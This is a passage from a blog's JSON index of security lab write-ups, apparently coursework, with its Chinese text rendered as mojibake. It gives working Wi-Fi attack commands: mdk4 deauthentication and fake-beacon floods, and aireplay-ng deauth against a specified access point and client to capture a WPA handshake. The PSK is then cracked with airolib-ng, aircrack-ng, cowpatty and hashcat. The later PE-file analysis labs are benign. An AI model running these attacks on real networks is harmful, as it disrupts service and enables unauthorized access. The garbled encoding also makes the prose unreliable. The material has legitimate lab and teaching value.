1mdk4 wlan0mon d -s 120 -c 11 å¯ä»¥ä½¿ç”¨Wiresharkæ•è·æ•°æ®åŒ…ï¼Œå°†ä¼šå‘ç°å¤§é‡çš„è§£é™¤è®¤è¯æ— çº¿æ•°æ®åŒ…ã€‚è¿æ¥ç›¸å…³ä¿¡é“çš„å®¢æˆ·ç«¯éƒ½ä¼šè¿æ¥ä¸­æ–­ã€‚ å‡ä¿¡æ ‡æ´ªæ°´æ”»å‡»ä½¿ç”¨mdk4å·¥å…·å®æ–½å‡ä¿¡æ ‡æ´ªæ°´æ”»å‡»çš„è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š 1mdk4 &lt;interface&gt; b &lt;test_options&gt; interface:æŒ‡å®šç”¨äºæ”»å‡»çš„ç½‘ç»œæ¥å£ï¼Œéœ€æ˜¯ç›‘å¬æ¨¡å¼çš„æ¥å£ã€‚ 12345678b: å®æ–½å‡ä¿¡æ ‡æ´ªæ°´æ”»å‡»æ¨¡å¼ã€‚-nï¼šè‡ªå®šä¹‰ESSIDã€‚-fï¼šè¯»å–ESSIDåˆ—è¡¨æ–‡ä»¶ã€‚-wï¼šé€‰æ‹©å‡ç½‘ç»œåº”å…·æœ‰çš„åŠ å¯†ç±»å‹ï¼Œæœ‰æ•ˆé€‰é¡¹ï¼šn=ä¸åŠ å¯†ï¼Œw=WEPï¼Œ t=TKIPï¼ˆWPAï¼‰ï¼Œa=AESï¼ˆWPA2ï¼‰ã€‚-tï¼š 1=ä»…åˆ›å»ºè‡ªç»„ç»‡ç½‘ç»œ ï¼Œ0=ä»…åˆ›å»ºManagedï¼ˆAPï¼‰ç½‘ç»œã€‚-mï¼šè¯»å–æ•°æ®åº“çš„MACåœ°å€ã€‚-sï¼šè®¾ç½®åŒ…çš„é€Ÿç‡ï¼Œé»˜è®¤ä¸º50ã€‚-cï¼šè‡ªå®šä¹‰ä¿¡é“ã€‚ æ‰§è¡Œä¸‹è¿°å‘½ä»¤åï¼Œå®¢æˆ·ç«¯å¯ä»¥æ¢æµ‹ä¸€ä¸ªESSIDä¸ºâ€œæµ‹è¯•WIFIâ€ã€å¤„äºManagedæ¨¡å¼ã€ä¿¡é“ä¸º6ã€åŠ å¯†æ–¹å¼ä¸ºWEPçš„å‡APã€‚ 1mdk4 wlan0mon b -n æµ‹è¯•WIFI -t 0 -w w -c 6 -s 80 1mdk4 wlan0mon b -w a -m -c 6 æ‰§è¡Œä¸Šè¿°å‘½ä»¤åï¼Œç”¨Wiresharkæ•è·æ•°æ®åŒ…ï¼Œå°†æ•è·å¤§é‡çš„Beaconä¿¡å·å¸§ã€‚è¿™äº›æ•°æ®åŒ…ä¸­å¹¿æ’­çš„SSIDéƒ½æ˜¯éšæœºäº§ç”Ÿçš„ã€‚ åˆ›å»ºä¸€ä¸ªåä¸ºssid.txtçš„æ–‡ä»¶ï¼Œç”¨æ¥ä¿å­˜å¦‚ä¸‹å››ä¸ªssid ç”¨-fé€‰é¡¹æŒ‡å®šäº†è¯¥åˆ—è¡¨æ–‡ä»¶ï¼Œæ‰§è¡Œä¸Šè¿°å‘½ä»¤åï¼Œå®¢æˆ·ç«¯å¯ä»¥æ¢æµ‹åˆ°å‡APã€‚ 1mdk4 wlan0mon b -f /root/ssid.txt -w a -c 6 -s 100 -m ç”¨Wiresharkæ•è·æ•°æ®åŒ…ï¼Œå°†æ•è·å¤§é‡çš„Beaconä¿¡å·å¸§ã€‚è¿™äº›æ•°æ®åŒ…ä¸­å¹¿æ’­çš„SSIDéƒ½æ˜¯ssid.txtäº§ç”Ÿçš„ã€‚","categories":[{"name":"å®éªŒ","slug":"å®éªŒ","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"æ— çº¿ç½‘ç»œå®‰å…¨","slug":"å®éªŒ/æ— çº¿ç½‘ç»œå®‰å…¨","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[],"author":"Gryffinbit"},{"title":"WPA-PSK/WPA2-PSKå·¥ä½œåŸç†","slug":"WPA-PSK-WPA2-PSKå·¥ä½œåŸç†","date":"2021-05-21T16:45:08.000Z","updated":"2024-11-12T06:58:42.000Z","comments":true,"path":"2021/05/22/WPA-PSK-WPA2-PSKå·¥ä½œåŸç†/","permalink":"https://gryffinbit.top/2021/05/22/WPA-PSK-WPA2-PSK%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/","excerpt":"","text":"å®éªŒç›®çš„æŒæ¡WPA-PSK&#x2F;WPA2-PSKå·¥ä½œåŸç†ã€‚åˆ©ç”¨wiresharkè¿‡æ»¤å™¨åˆ†ææ•´ä¸ªæµç¨‹ï¼Œç‰¹åˆ«æ˜¯å››æ¬¡æ¡æ‰‹çš„è¿‡ç¨‹ã€‚ç†Ÿæ‚‰æ•è·å››æ¬¡æ¡æ‰‹ä¸­å“ªäº›Messageä¹‹åæ‰èƒ½è¿›è¡ŒPSKç ´è§£ã€‚ å®éªŒç¯å¢ƒKaliæ“ä½œç³»ç»ŸåŠç›¸å…³å·¥å…·æ— çº¿ç½‘å¡æ— çº¿AP å®éªŒåŸç†WPA-PSKè¿æ¥è¿‡ç¨‹ï¼š Open System Authentication (Request initiate by client) Open system Authentication (Response by AP) Association Request (sent by client) Association Response (send by AP) 4-Way Handshake â€“ EAPoL Key Exchange Message 1 4-Way Handshake â€“ EAPoL Key Exchange Message 2 4-Way Handshake â€“ EAPoL Key Exchange Message 3 4-Way Handshake â€“ EAPoL Key Exchange Message 4 DHCP Discover (send by client to L2 broadcast) DHCP Offer (send by DHCP server) DHCP Reqeust (send by client to L2 broadcast) DHCP ACK (send by DHCP server to client) å®éªŒè¿‡ç¨‹è¯·è‡ªè¡Œé’ˆå¯¹æŸWPA-PSKçš„APè¿›è¡ŒæŠ“åŒ…ï¼Œå¹¶ç”¨å®¢æˆ·ç«¯è¿æ¥APï¼Œç„¶åç”¨è¿‡æ»¤å™¨è¯­æ³•åˆ†ææ•´ä¸ªPSKè¿æ¥è¿‡ç¨‹ã€‚ 1ï¼Œæ‰“å¼€æ— çº¿ç½‘å¡ç›‘å¬æ¨¡å¼ã€‚ 1airmon-ng start wlan0 2ï¼Œç”¨airodump-ngæŠ“åŒ…ï¼Œæ‰¾åˆ°ç›®æ ‡APã€‚ 1airodump-ng wlan0mon 3ï¼Œé’ˆå¯¹æŸä¸ªAPè¿›è¡ŒæŠ“åŒ…ï¼Œå¹¶ä¿å­˜ã€‚ 1airodump-ng wlan0mon -c 11 --bssid 78:A3:51:15:67:C6 -w handshake 4ï¼Œç”¨å®¢æˆ·ç«¯è¿æ¥APã€‚5ï¼Œå‘èµ·å¤šæ¬¡DEAUTHæ”»å‡»ï¼ŒæŠ“å››æ¬¡æ¡æ‰‹åŒ…ã€‚ 1aireplay-ng -0 10 -a 78:A3:51:15:67:C6 -c 0E:7F:6D:E0:E0:F5 wlan0mon 78:A3:51:15:67:C6 æ˜¯è¦æ”»å‡»çš„Wi-Fiçš„bssid 0E:7F:6D:E0:E0:F5 æ˜¯å·²ç»è¿æ¥çš„è®¾å¤‡çš„bssid 6ï¼Œç”¨wiresharkè¿‡æ»¤å™¨åˆ†æä¿¡æ ‡å¸§Beaconsã€è®¤è¯Authenticationã€è¿æ¥è¯·æ±‚Association Request ã€ è¿æ¥å›åº”Association Response ã€å››æ¬¡æ¡æ‰‹å’Œè·å–DHCPçš„è¿‡ç¨‹ã€‚ æ¯”å¦‚ï¼šå››æ¬¡æ¡æ‰‹ä¸­æ¯æ¡Messageå«æœ‰éšæœºæ•°çš„æƒ…å†µä»¥åŠæŠ¥æ–‡ä¸­æ˜¯å¦æœ‰MICå€¼ã€‚è¿›ä¸€æ­¥çš„ï¼Œè¯·æ€è€ƒæ˜¯å¦åªæœ‰æ•è·å®Œæ•´çš„å››æ¬¡æ¡æ‰‹æ‰èƒ½è¿›è¡ŒPSKç ´è§£ï¼Ÿ ç”¨wlan.fc.type_subtype&#x3D;&#x3D;0X0Bæ˜¾ç¤ºè¿‡æ»¤æ•è·æ–‡ä»¶ä¸­æ‰€æœ‰çš„èº«ä»½è®¤è¯æ•°æ®åŒ…ã€‚AUTHè®¤è¯ç±»å‹æœ‰ä¸¤ç§ï¼Œ0è¡¨ç¤ºå¼€æ”¾å¼ï¼Œ1è¡¨ç¤ºå…±äº«å¼ã€‚WPA&#x2F;WPA2æ˜¯å¼€æ”¾å¼è®¤è¯ã€‚ ç”¨wlan.fc.type_subtype&#x3D;&#x3D;0X08è¿›è¡Œè¿‡æ»¤ï¼Œåªæ˜¾ç¤ºBeaconså¸§ã€‚ å¯ä»¥æŸ¥çœ‹ESSIDå’ŒBSSIDå’Œå·¥ä½œçš„ä¿¡é“ã€‚ åŒæ—¶ï¼Œåœ¨ä¿¡æ ‡å¸§ä¹Ÿå¯æŸ¥çœ‹APä½¿ç”¨çš„åŠ å¯†æ–¹å¼ã€‚ä½¿ç”¨WPAåŠ å¯†çš„APï¼Œåœ¨æ•è·åŒ…ä¸­å³å¯çœ‹åˆ°WPA Information Elementä¿¡æ¯ã€‚å¦‚æœä½¿ç”¨ WEPåŠ å¯†ï¼Œå°†ä¸ä¼šå‡ºç°WPA Information Elementä¿¡æ¯ã€‚åŒæ—¶å¯ä»¥çœ‹åˆ°APå…·æœ‰WPSåŠŸèƒ½ï¼Œå¹¶ä¸”å¯ç”¨äº†WPSåŠŸèƒ½ï¼ˆconfiguredï¼‰ ç”¨wlan.fc.type_subtype&#x3D;&#x3D;0X00è¿‡æ»¤å…³è”è¯·æ±‚ï¼Œå¯ä»¥æ‰¾å‡ºä¸å®¢æˆ·ç«¯è¿æ¥çš„AP ã€‚ å¦‚å›¾ï¼Œå¯ä»¥çœ‹åˆ°APçš„MACåœ°å€ã€å®¢æˆ·ç«¯çš„MACåœ°å€å’ŒAPçš„ESSIDã€‚ è¾“å…¥eapolå¯ä»¥è¿‡æ»¤æ¡æ‰‹åŒ…ã€‚ æ³¨ï¼šå¹¶ä¸éœ€è¦è§£å¯†å°±èƒ½æŸ¥çœ‹DHCP ACKæ•°æ®åŒ…ä¸­çš„ç›¸å…³ä¿¡æ¯ã€‚ â€‹ å®éªŒåŸç†ï¼šWPAå¯†ç å…¶å®å«PSKï¼ˆpre-shared keyï¼‰ï¼Œå®ƒåŠ ä¸Šssidé€šè¿‡ä¸€å®šçš„ç®—æ³•å¯ä»¥å¾—åˆ°PMKï¼ˆpairwise master keyï¼‰: â€‹ $$ PMK&#x3D;SHA_1(ssid,psk) $$â€‹ PMKçš„é•¿åº¦æ˜¯å®šé•¿çš„ï¼Œéƒ½æ˜¯64å­—èŠ‚ã€‚ç”±äºè®¡ç®—PMKçš„è¿‡ç¨‹å¼€é”€æ¯”è¾ƒå¤§ï¼Œæ˜¯æˆ‘ä»¬ç ´è§£èŠ±è´¹æ—¶é—´é•¿çš„å…³é”®ï¼Œæ‰€ä»¥é‡‡ç”¨ä»¥ç©ºé—´æ¢æ—¶é—´çš„åŸåˆ™æŠŠPMKäº‹å…ˆç”Ÿæˆå¥½ï¼Œè¿™ä¸ªäº‹å…ˆç”Ÿæˆå¥½çš„è¡¨å°±æ˜¯å¸¸è¯´çš„HASHè¡¨ï¼Œè¿™ä¸ªå·¥ä½œå°±æ˜¯ç”¨airlib-ngè¿™ä¸ªå·¥å…·æ¥å®Œæˆã€‚â€‹ ç›®å‰çš„ç ´è§£æ–¹æ³•æ˜¯æˆ‘ä»¬è·å¾—æ¡æ‰‹åŒ…åï¼Œç”¨æˆ‘ä»¬å­—å…¸ä¸­çš„PSK+ssidç”ŸæˆPMKï¼Œç„¶åç»“åˆæ¡æ‰‹åŒ…ä¸­çš„ï¼ˆå®¢æˆ·ç«¯MACï¼ŒAPçš„BSSIDï¼Œ$A_NONCE$ï¼Œ$S_NONCE$ï¼‰è®¡ç®—PTKï¼Œå†åŠ ä¸ŠåŸå§‹çš„æŠ¥æ–‡æ•°æ®ç®—å‡ºMICå¹¶ä¸APå‘é€çš„MICæ¯”è¾ƒï¼Œå¦‚æœä¸€è‡´ï¼Œé‚£ä¹ˆè¯¥PSKå°±æ˜¯å¯†é’¥ã€‚ airolib-ngâ€‹ airolib-ngæ˜¯Aircrack-ngå¥—è£…é‡Œçš„åˆä¸€ä¸ªå·¥å…·ï¼Œç”¨æ¥å­˜å‚¨å’Œå¤„ç†ç½‘ç»œåå’Œå¯†ç è¡¨ã€‚é€šè¿‡è®¡ç®—PMKï¼Œç”¨äºWPA&#x2F;WPA2çš„ç ´è§£ã€‚å…¶è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š 1airolib &lt;database&gt; &lt;operation&gt; [options] é€‰é¡¹ è¯´æ˜ database è¡¨ç¤ºæ•°æ®åº“æ–‡ä»¶ï¼Œå¯ä»¥æ˜¯ç»å¯¹è·¯å¾„ã€‚ operation æŒ‡å®šäº†æˆ‘ä»¬è¦å¯¹æ•°æ®åº“è¿›è¡Œçš„æ“ä½œã€‚ â€“import {essid|passwd} {file} å¯¼å…¥å«æœ‰ç½‘ç»œåæˆ–è€…ç§˜é’¥åˆ—è¡¨çš„æ–‡æœ¬æ–‡ä»¶ã€‚æ–‡ä»¶æ¯è¡Œéœ€å«ä¸€ä¸ªç½‘ç»œåæˆ–è€…å¯†ç ï¼Œä»¥æ¢è¡Œç¬¦ç»“æŸï¼ˆè¿™æ ·è¯»å…¥æ—¶å°±ä¼šè¢«å½“åšâ€œenterâ€ï¼‰ã€‚ â€“batch å¼€å§‹è®¡ç®—æ‰€æœ‰ç½‘ç»œåå’Œå¯†ç çš„ç»„åˆã€‚æ­¤å‘½ä»¤éœ€ç”¨åœ¨aircrack-ngç ´è§£ä¹‹å‰ã€‚å½“æ•°æ®åº“æ·»åŠ äº†æ–°çš„SSIDæˆ–è€…å¯†ç æ—¶ï¼Œä¹Ÿè®¸é‡æ–°è®¡ç®—ã€‚ â€“export cowpatty [essid] [file] å¯¼å‡ºä¸ºcowpattyæ–‡ä»¶ã€‚ â€“sql {sql} æ‰§è¡Œæ‰€ç»™çš„SQLè¯­å¥ã€‚ airolib-ng â€“help æŸ¥çœ‹å¸®åŠ©æ–‡æ¡£ã€‚ 1.åˆ›å»ºåŒ…å«ESSIDçš„æ–‡æ¡£ åˆ›å»ºåŒ…å«ESSIDçš„æ–‡æ¡£ï¼Œæ¯è¡Œå«æœ‰ä¸€ä¸ªESSIDã€‚åˆ›å»ºåç§°ä¸ºgryffinbitï¼ˆåç§°è‡ªå–ï¼‰çš„æ•°æ®åº“ï¼Œå‘æ•°æ®åº“æ’å…¥ESSIDã€‚ 1airolib-ng gryffinbit --import essid /root/ssid.txt 2.åˆ›å»ºåŒ…å«å¯†ç çš„æ–‡æ¡£ï¼Œå¹¶å‘rainbowæ•°æ®åº“æ’å…¥å¯†ç ã€‚ 1airolib-ng gryffinbit --import password /root/password.txt 3.æ‰¹é‡ç”Ÿäº§PMKæ•°æ®ã€‚ 1airolib-ng gryffinbit --batch æŸ¥çœ‹æ•°æ®çš„çŠ¶æ€ 1airolib-ng gryffinbit --stats å¯ä»¥çœ‹åˆ°ï¼Œå½“å‰æ•°æ®åº“ä¸­æœ‰11ä¸ªESSIDå’Œ16ä¸ªå¯†ç ï¼Œå¹¶ä¸”å·²æˆåŠŸå¯¹å…¶è¿›è¡Œäº†è®¡ç®—ã€‚ 4.ä½¿ç”¨aircrack-ngè¿›è¡Œç ´è§£ 1aircrack-ng -r gryffinbit -e helloworld handshake-01.cap é€‰é¡¹ è¯´æ˜ -r æŒ‡å®šPMKæ•°æ®åº“ -e æŒ‡å®šESSID â€‹ ä¹Ÿå¯ä»¥é€‰æ‹©ä½¿ç”¨Cowpattyå·¥å…·è¿›è¡Œç ´è§£ã€‚Cowpattyæ˜¯ä¸€æ¬¾Linuxä¸‹ç”¨äºç ´è§£WPA-PSKåŠ å¯†çš„å·¥å…·ã€‚å…¶è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š 1cowpatty [options] é€‰é¡¹ è¯´æ˜ -d Hashè¡¨ -r å«æœ‰æ¡æ‰‹åŒ…çš„capæ–‡ä»¶ -s APçš„ESSID åœ¨ä½¿ç”¨Cowpattyä¹‹å‰ï¼Œéœ€è¦å…ˆæå–ç”¨äºcowpattyè·‘çš„hash è¡¨ã€‚ 1airolib-ng gryffinbit --export cowpatty helloworld R_table ç„¶åå°±å¯ä»¥ä½¿ç”¨Cowpattyå·¥å…·ã€‚ 1cowpatty -s kong -d R_table -r .cap â€‹ â€‹ ä½¿ç”¨airolib-ngç”ŸæˆPMKæ•°æ®åï¼Œå¯ä»¥å¯¹è¯¥æ•°æ®è¿›è¡Œç®¡ç†ï¼Œæ¯”å¦‚å¯¼å…¥ç¬¬ä¸‰æ–¹æ•°æ®ã€æ ¡éªŒæ•°æ®å’Œæ¸…ç†æ•°æ®ã€‚å¯¼å…¥ssidlist.txt æ–‡ä»¶ä¸­çš„ESSIDåˆ°æ•°æ®åº“ã€‚ 1airolib-ng gryffinbit --import password /root/password.txt å¯¼å…¥pword.txt æ–‡ä»¶ä¸­çš„å¯†ç åˆ°æ•°æ®åº“ã€‚ 1airolib-ng gryffinbit --import essid /root/ssidlist.txt ä½¿ç”¨â€“verifyé€‰é¡¹æ ¡éªŒæ•°æ®ï¼Œä»¥éªŒè¯æ•°æ®åº“çš„çŠ¶æ€æ­£å¸¸ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨â€“cleané€‰é¡¹è¿›è¡Œæ•°æ®æ¸…ç†ã€‚ 1airolib-ng gryffinbit --verify å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤è¡Œæ’å…¥å•ä¸ªESSIDã€‚æ’å…¥å•ä¸ªå¯†ç ä¹Ÿå¯ç±»ä¼¼æ“ä½œã€‚ 1echo Love | airolib-ng gryffinbit --import essid - hashcatå·¥å…·â€‹ hashcatä¸€æ¬¾å¼ºå¤§çš„å¼€æºå¯†ç æ¢å¤å·¥å…·ã€‚è¯¥å·¥å…·å¯ä»¥åˆ©ç”¨CPUæˆ–GPUèµ„æºï¼Œç ´è§£å¤šç§hashç±»å‹çš„å¯†ç ã€‚å½“æ•è·æ¡æ‰‹åŒ…ä»¥åï¼Œå¯ä»¥ä½¿ç”¨è¯¥å·¥å…·å¿«é€Ÿçš„ç ´è§£å‡ºWPAå¯†ç ã€‚ä½¿ç”¨hashcatå·¥å…·ç ´è§£WPAçš„è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š 1hashcat -m 2500 [pcap file ] [words] --force é€‰é¡¹ è¯´æ˜ -m æŒ‡å®šä½¿ç”¨çš„hashç±»å‹,ä¸WPAç›¸å…³çš„hashå¦‚ä¸‹å›¾ã€‚ Words æŒ‡å®šè¦ä½¿ç”¨çš„å­—å…¸ã€‚ â€“force å¿½ç•¥è­¦å‘Šä¿¡æ¯ã€‚ hashcat â€“help æŸ¥çœ‹å¸®åŠ©æ–‡æ¡£ã€‚ 1.ä½¿ç”¨aircrack-ngå°†æ•è·çš„æ¡æ‰‹åŒ…æ–‡ä»¶è½¬æ¢ä¸ºhccapxæ ¼å¼ã€‚ 1aircrack-ng test-01.cap -j hashcattest 2.ä½¿ç”¨hashcatå·¥å…·è¿›è¡Œç ´è§£ã€‚ 1hashcat -m 2500 hashcattest.hccapx /root/password.txt --force","categories":[{"name":"å®éªŒ","slug":"å®éªŒ","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"æ— çº¿ç½‘ç»œå®‰å…¨","slug":"å®éªŒ/æ— çº¿ç½‘ç»œå®‰å…¨","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"WPA","slug":"WPA","permalink":"https://gryffinbit.top/tags/WPA/"}],"author":"Gryffinbit"},{"title":"PEæ–‡ä»¶å¯¼å‡ºè¡¨","slug":"PEæ–‡ä»¶å¯¼å‡ºè¡¨","date":"2021-05-21T16:11:20.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2021/05/22/PEæ–‡ä»¶å¯¼å‡ºè¡¨/","permalink":"https://gryffinbit.top/2021/05/22/PE%E6%96%87%E4%BB%B6%E5%AF%BC%E5%87%BA%E8%A1%A8/","excerpt":"","text":"å‚è€ƒæ•™æhttps://gryffinbit.lanzoui.com/iC3shpbqocd å®éªŒå†…å®¹1ã€å‚è€ƒæ•™æP83-P86ï¼Œåœ¨VC2010ä¸‹åˆ›å»ºä¸€ä¸ªåå­—ä¸ºâ€œdlltestâ€çš„ç©ºDLLå·¥ç¨‹ï¼Œè¯¥å·¥ç¨‹ä»¥å¦‚ä¸‹æºæ–‡ä»¶dlltest.cä¸ºåŸºç¡€ï¼Œäº§ç”Ÿä¸€ä¸ªdlltest.dllæ–‡ä»¶ã€‚ 12345678910111213141516171819202122232425262728293031 \\#include &lt;Windows.h&gt;void Func1()&#123;MessageBox(NULL, L&quot;Func_1&quot;, NULL, MB_OK);&#125;void Func2()&#123;MessageBox(NULL, L&quot;Func_2&quot;, NULL, MB_OK);&#125;void Func3()&#123;MessageBox(NULL, L&quot;Func_3&quot;, NULL, MB_OK);&#125;void Func4()&#123;MessageBox(NULL, L&quot;Func_4&quot;, NULL, MB_OK);&#125;void Func5()&#123;MessageBox(NULL, L&quot;Func_5&quot;, NULL, MB_OK);&#125; 2ã€ç¼–å†™dlltest.defæ–‡æœ¬æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š 1234567891011LIBRARY dlltestEXPORTSFunc1 @ 3Func2 @ 5Func3 @ 6 NONAMEFunc5 å°†dlltest.defæ–‡ä»¶æ”¾åœ¨ä¸Šè¿°DLLå·¥ç¨‹ä¸­ä¸dlltest.cæºæ–‡ä»¶ç›¸åŒçš„ç›®å½•ä¸‹ï¼Œå¹¶æŒ‰ç…§æ•™æP84ï¼Œè¿›è¡ŒDLLæ„å»ºè®¾ç½®ã€‚ 3ã€åˆ›å»ºä¸Šè¿°DLLçš„æµ‹è¯•å·¥ç¨‹dllclientï¼Œè¯¥å·¥ç¨‹ä»¥å¦‚ä¸‹æºæ–‡ä»¶dllclient.cä¸ºåŸºç¡€ã€‚ 1234567891011121314151617181920212223#include &lt;Windows.h&gt;typedef void(*Func)();int main() &#123;Func Func1, Func2, Func3, Func5;HMODULE hMod=LoadLibrary(L&quot;dlltest.dll&quot;); // æ˜¾å¼è°ƒç”¨Func1=(Func)GetProcAddress(hMod, &quot;Func1&quot;); Func1();Func2=(Func)GetProcAddress(hMod, &quot;Func2&quot;); Func2();Func3=(Func)GetProcAddress(hMod, (LPCSTR) 6); Func3();Func5=(Func)GetProcAddress(hMod, &quot;Func5&quot;); Func5();FreeLibrary(hMod);return 0;&#125; æ³¨æ„ï¼Œæ‰§è¡Œdllclientå·¥ç¨‹å‰ï¼Œéœ€è¦å°†ä¹‹å‰ç¼–è¯‘å¥½çš„dlltest.dllæ–‡ä»¶æ”¾åœ¨dllclient.exeæ–‡ä»¶æ‰€åœ¨ç›®å½•ä¸‹ã€‚ 4ã€æŒ‰P87-P95çš„å†…å®¹ï¼Œåˆ†æè¯¥dlltest.dllæ–‡ä»¶çš„å¯¼å‡ºè¡¨IMAGE_EXPORT_DIRECTORYç»“æ„ä½“ä¸­å¦‚ä¸‹å‡ ä¸ªå­—æ®µã€‚ 12345678910111213(1) DWORD Name(2) DWORD Base(3) DWORD NumberOfFunctions (4) DWORD NumberOfNames(5) DWORD AddressOfFunctions(6) DWORD AddressOfNames(7) DWORD AddressOfnameOrdinals å®éªŒè¦æ±‚1ã€è¿è¡Œdllclientå·¥ç¨‹ï¼Œäº†è§£DLLçš„å·¥ä½œæ–¹å¼ã€‚ 2ã€ä½¿ç”¨C32asmä¸LordPEä¸¤ä¸ªå·¥å…·å¯¹dlltest.dllæ–‡ä»¶è¿›è¡Œåˆ†æã€‚ï¼ˆ010editoræ›´å¥½ç”¨ï¼‰ 3ã€è¦æ±‚å¯¹å¯¼å‡ºè¡¨ä¸Šè¿°å­—æ®µçš„å€¼é€ä¸€åœ¨C32asmå·¥å…·ä¸­åˆ†åˆ«æˆªå›¾ï¼Œç„¶åå¯¹ç…§æˆªå›¾ï¼Œå¯¹å¯¼å‡ºè¡¨å­—æ®µï¼Œåœ¨å®éªŒç»“æœä¸­ç”¨è¡¨æ ¼è¿›è¡Œè¯´æ˜ã€‚ 4ã€å¯¹ä¸Šè¿°å„ä¸ªå­—æ®µçš„å«ä¹‰è¿›è¡Œå‡†ç¡®ç†è§£ã€‚ å®éªŒç»“æœè¯·åœ¨æ­¤å¤„æŒ‰ç…§å®éªŒè¦æ±‚è¿›è¡Œæˆªå›¾ï¼Œå¹¶é€ä¸€åœ¨å…¶åé€šè¿‡è¡¨æ ¼å¯¹å¯¼å‡ºè¡¨ç»“æ„ä¸­å„ä¸ªç»“æ„ä½“å†…éƒ¨å­—æ®µå€¼è¿›è¡Œè®°å½•ï¼š åœ°å€ å€¼ï¼ˆå†…å­˜æ˜ åƒï¼‰ å­—æ®µå A81C h 1B85A h DWORD Name A820 h 3 DWORD Base A824 h 4 DWORD NumberOfFunctions A828 h 3 DWORD NumberOfNames A82C h 1B838 h DWORD AddressOfFunctions A830 h 1B848 h DWORD AddressOfNames A834 h 1B854 h DWORD AddressOfNameOrdinals","categories":[{"name":"å®éªŒ","slug":"å®éªŒ","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"é€†å‘","slug":"å®éªŒ/é€†å‘","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E9%80%86%E5%90%91/"}],"tags":[{"name":"PE","slug":"PE","permalink":"https://gryffinbit.top/tags/PE/"}],"author":"Gryffinbit"},{"title":"PEæ–‡ä»¶ç»“æ„åˆ†æ","slug":"PEæ–‡ä»¶ç»“æ„åˆ†æ","date":"2021-05-14T08:52:41.000Z","updated":"2024-11-12T06:59:24.000Z","comments":true,"path":"2021/05/14/PEæ–‡ä»¶ç»“æ„åˆ†æ/","permalink":"https://gryffinbit.top/2021/05/14/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/","excerpt":"","text":"æ•™æå‚è€ƒå®éªŒåŸç†è¯·å‚è€ƒæ•™æã€‚é™„ä¸Šè¯¥éƒ¨åˆ†æ•™æçš„PDFä¸‹è½½é“¾æ¥ https://gryffinbit.lanzoui.com/iUvfRpbfjlg å®éªŒç›®çš„é€šè¿‡å¯¹Win32å¹³å°ä¸‹PEæ–‡ä»¶ç»“æ„çš„åˆ†æï¼Œç†Ÿç»ƒæŒæ¡PEæ–‡ä»¶ç»“æ„ä¸­å„ä¸»è¦ç»„æˆéƒ¨åˆ†çš„æ„æˆï¼Œä»¥åŠæ–‡ä»¶åç§»FOAä¸å†…å­˜ç›¸å¯¹è™šæ‹Ÿåœ°å€RVAä¹‹é—´çš„è½¬æ¢ã€‚ å®éªŒå†…å®¹ ã€åœ¨Win10ä¸‹ç¼–è¯‘å¦‚ä¸‹æ±‡ç¼–æºç¨‹åºpedemo.asmï¼Œç¼–è¯‘åçš„PEæ–‡ä»¶å‘½åä¸ºpedemo.exe; æ–‡ä»¶å: pedemo.asm 12345678910111213141516171819.386.model flat, stdcalloption casemap:noneinclude windows.incinclude kernel32.incinclude user32.incincludelib kernel32.libincludelib user32.lib.data? data db 1000h dup (?) ; æœªåˆå§‹åŒ–æ•°æ®.data szText db &#x27;Test&#x27;, 0 ; 5å­—èŠ‚æ•°æ®.codestart: invoke MessageBox, NULL, offset szText, NULL, MB_OK mov data, 1 invoke ExitProcess, NULLend start åˆ†æpedemo.exeæ–‡ä»¶ä¸­å¦‚ä¸‹å‡ éƒ¨åˆ†å†…å®¹ï¼š å‚è€ƒæ•™æP70ï½84 (1) DOSå¤´éƒ¨ (2) PEæ ‡è¯† (3) IMAGE_FILE_HEADER (4) IMAGE_OPTIONAL_HEADER (5) IMAGE_DATA_DIRECTORYä¸­ä¸IMAGE_IMPORT_DESCRIPTORæœ‰å…³éƒ¨åˆ† (6) IMAGE_SECTION_HEADER (7) IMAGE_IMPORT_DESCRIPTORï¼ˆINTã€IATï¼‰ å®éªŒè¦æ±‚1ã€ä½¿ç”¨C32asmä¸LordPEä¸¤ä¸ªå·¥å…·å¯¹pedemo.exeæ–‡ä»¶è¿›è¡Œåˆ†æã€‚ â€‹ ï¼ˆå¯ä»¥ä½¿ç”¨010editorè¿›è¡Œåˆ†æï¼‰ 2ã€è¦æ±‚å¯¹PEæ–‡ä»¶å„ä¸ªéƒ¨åˆ†çš„å­—æ®µçš„å€¼é€ä¸€è¿›è¡Œè¯´æ˜ï¼Œå…¶ä¸­DOSå¤´éƒ¨ä»…éœ€è¦è¯´æ˜e_magicå’Œe_lfanewä¸¤ä¸ªå­—æ®µã€‚æ­¤å¤–ï¼Œè¦æ±‚åœ¨C32asmå·¥å…·ä¸­å¯¹PEæ–‡ä»¶ç›¸å…³éƒ¨åˆ†åˆ†åˆ«æˆªå›¾ï¼Œç„¶åå¯¹ç…§æˆªå›¾ï¼Œå¯¹PEç»“æ„ä½“ä¸­çš„å­—æ®µï¼Œåœ¨å®éªŒç»“æœä¸­ç”¨è¡¨æ ¼è¿›è¡Œè¯´æ˜ã€‚ å®éªŒç»“æœè¯·åœ¨æ­¤å¤„æŒ‰ç…§å®éªŒè¦æ±‚è¿›è¡Œæˆªå›¾ï¼Œå¹¶é€ä¸€åœ¨å…¶åé€šè¿‡è¡¨æ 